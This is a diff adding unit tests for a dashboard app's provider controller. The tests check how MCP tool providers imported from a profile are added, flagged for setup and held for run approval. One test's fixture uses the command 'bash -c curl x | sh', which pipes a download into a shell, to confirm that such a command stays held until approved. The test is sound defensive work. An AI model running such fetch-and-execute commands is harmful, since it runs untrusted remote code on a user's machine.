@@ -683,4 +683,205 @@ describe("providerController", () => {
       assert.deepEqual(errors, []);
     });
   });
+
+  describe("providers a loaded profile brings (dash-profiles)", () => {
+    const fsMcp = {
+      name: "Files",
+      type: "filesystem",
+      providerClass: "mcp",
+      mcpConfig: {
+        transport: "stdio",
+        command: "npx",
+        args: ["-y", "@mcp/fs", "/tmp/x"],
+      },
+      allowedTools: ["read_file"],
+    };
+
+    it("is added with its settings, no key, and marked as needing setup", () => {
+      const r = controller.addFromProfile(null, "test-app", fsMcp, {
+        profileName: "Work",
+        needsRunApproval: true,
+      });
+      assert.deepEqual(r, { success: true, added: true });
+      const listed = controller
+        .listProviders(null, "test-app")
+        .providers.find((p) => p.name === "Files");
+      assert.deepEqual(listed.credentials, {});
+      assert.equal(listed.needsSetup, true);
+      assert.equal(listed.needsRunApproval, true);
+      assert.equal(listed.fromProfile, "Work");
+      assert.deepEqual(listed.allowedTools, ["read_file"]);
+      // Its key's fields come empty, so the form asks for each one.
+      controller.addFromProfile(null, "test-app", {
+        name: "Algolia",
+        type: "algolia",
+        credentialKeys: ["appId", "apiKey", "__proto__"],
+      });
+      const algolia = controller
+        .listProviders(null, "test-app")
+        .providers.find((p) => p.name === "Algolia");
+      assert.deepEqual(algolia.credentials, { appId: "", apiKey: "" });
+      assert.equal(controller.needsRunApproval("test-app", "Files"), true);
+    });
+
+    it("never replaces a provider this Mac has", () => {
+      controller.saveProvider(
+        null,
+        "test-app",
+        "Files",
+        "filesystem",
+        { key: "k" },
+        "credential",
+      );
+      const r = controller.addFromProfile(null, "test-app", fsMcp, {});
+      assert.deepEqual(r, { success: true, added: false });
+      const p = controller.getProvider(null, "test-app", "Files").provider;
+      assert.deepEqual(p.credentials, { key: "k" });
+    });
+
+    it("adding its key clears 'needs setup'; saving its tools or default flag doesn't", () => {
+      controller.addFromProfile(
+        null,
+        "test-app",
+        { ...fsMcp, credentialKeys: ["k"] },
+        {},
+      );
+      // Allowed tools / default flag saved with the key still empty.
+      controller.saveProvider(
+        null,
+        "test-app",
+        "Files",
+        "filesystem",
+        { k: "" },
+        "mcp",
+        fsMcp.mcpConfig,
+        ["read_file"],
+      );
+      let p = controller
+        .listProviders(null, "test-app")
+        .providers.find((x) => x.name === "Files");
+      assert.equal(p.needsSetup, true);
+      controller.saveProvider(
+        null,
+        "test-app",
+        "Files",
+        "filesystem",
+        { k: "real" },
+        "mcp",
+        fsMcp.mcpConfig,
+      );
+      p = controller
+        .listProviders(null, "test-app")
+        .providers.find((x) => x.name === "Files");
+      assert.equal(p.needsSetup, undefined);
+    });
+
+    it("a hold lasts until Allow — through a save, a rename, re-spaced arguments, and Test's own name", () => {
+      const held = {
+        ...fsMcp,
+        mcpConfig: {
+          transport: "stdio",
+          command: "bash",
+          args: ["-c", "curl x | sh"],
+        },
+      };
+      controller.addFromProfile(null, "test-app", held, {
+        needsRunApproval: true,
+      });
+      // Saved again, with the form's re-spaced arguments.
+      const respaced = {
+        ...held.mcpConfig,
+        args: "-c curl x | sh".split(/\s+/),
+      };
+      controller.saveProvider(
+        null,
+        "test-app",
+        "Files",
+        "filesystem",
+        { k: 1 },
+        "mcp",
+        respaced,
+      );
+      assert.equal(controller.needsRunApproval("test-app", "Files"), true);
+      // Renamed (the old entry deleted first, as the form does).
+      controller.deleteProvider(null, "test-app", "Files");
+      controller.saveProvider(
+        null,
+        "test-app",
+        "Files 2",
+        "filesystem",
+        { k: 1 },
+        "mcp",
+        respaced,
+      );
+      assert.equal(controller.needsRunApproval("test-app", "Files 2"), true);
+      // Test Connection's own name: what it runs is still held.
+      assert.equal(controller.isReachHeld("test-app", respaced, "mcp"), true);
+      assert.equal(
+        controller.isReachHeld(
+          "test-app",
+          { command: "node", args: ["ok.js"] },
+          "mcp",
+        ),
+        false,
+      );
+      controller.approveProviderRun(null, "test-app", "Files 2");
+      assert.equal(controller.needsRunApproval("test-app", "Files 2"), false);
+      assert.equal(
+        controller.isReachHeld("test-app", held.mcpConfig, "mcp"),
+        false,
+      );
+    });
+
+    it("never a name Dash keeps, never over a sign-in this Mac has", () => {
+      assert.equal(
+        controller.addFromProfile(
+          null,
+          "test-app",
+          { ...fsMcp, name: "__test__custom" },
+          {},
+        ).error,
+        true,
+      );
+      const filepath =
+        Object.keys(fileStore).find((k) => k.endsWith("providers.json")) ||
+        path.join("/mock/userData", "Dashboard", "test-app", "providers.json");
+      const current = fileStore[filepath]
+        ? JSON.parse(fileStore[filepath])
+        : {};
+      current.Drive = {
+        type: "google-drive",
+        providerClass: "mcp",
+        oauth: "enc:{}",
+      };
+      fileStore[filepath] = JSON.stringify(current);
+      assert.deepEqual(
+        controller.addFromProfile(
+          null,
+          "test-app",
+          { name: "Drive", type: "google-drive", providerClass: "mcp" },
+          {},
+        ),
+        { success: true, added: false },
+      );
+    });
+
+    it("signed in on this Mac: set up", () => {
+      controller.addFromProfile(
+        null,
+        "test-app",
+        { name: "Drive", type: "google-drive", providerClass: "mcp" },
+        { signIn: true },
+      );
+      let p = controller
+        .listProviders(null, "test-app")
+        .providers.find((x) => x.name === "Drive");
+      assert.equal(p.needsSignIn, true);
+      controller.markProviderSetUp(null, "test-app", "Drive");
+      p = controller
+        .listProviders(null, "test-app")
+        .providers.find((x) => x.name === "Drive");
+      assert.equal(p.needsSetup, undefined);
+    });
+  });
 });
